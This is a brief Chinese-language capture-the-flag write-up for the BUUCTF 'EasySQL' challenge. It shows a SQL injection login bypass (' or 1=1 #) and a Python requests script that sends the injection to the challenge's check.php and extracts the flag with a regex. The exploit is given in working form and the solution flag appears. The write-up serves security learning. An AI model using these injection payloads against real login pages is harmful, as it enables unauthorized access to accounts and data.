# 分析

来自[[极客大挑战2019]EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)

发现是一个登录页面，试一下万能密码`' or 1=1 #'`，可以直接绕过

![image-20240624203939339](image/image-20240624203939339.png)

拿到`flag{89ab3118-b79b-4754-9e6d-f571c1716a05}`

![image-20240624204212653](image/image-20240624204212653.png)

# exp

```python
import requests
import re

# 目标URL基础部分
url = "http://26c79033-5c5c-4540-9318-9ef298c68228.node5.buuoj.cn:81/check.php"
# 构造带有SQL注入的查询参数
kw = {
    'username': "'or 1=1-- +",
    'password': "123"
}
# 发送GET请求
res = requests.get(url, params=kw)
# 检查响应状态码
if res.status_code == 200:
    # 读取响应内容
    res_text = res.text
    # 打印响应内容（可选）
    #print("Response:", res_text)
    # 使用正则表达式查找 flag
    flag_pattern = r"flag\{.*?\}"
    flag_match = re.search(flag_pattern, res_text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"flag is -->> {flag}")
    else:
        print("flag not found.")
else:
    print("Request failed.")
```

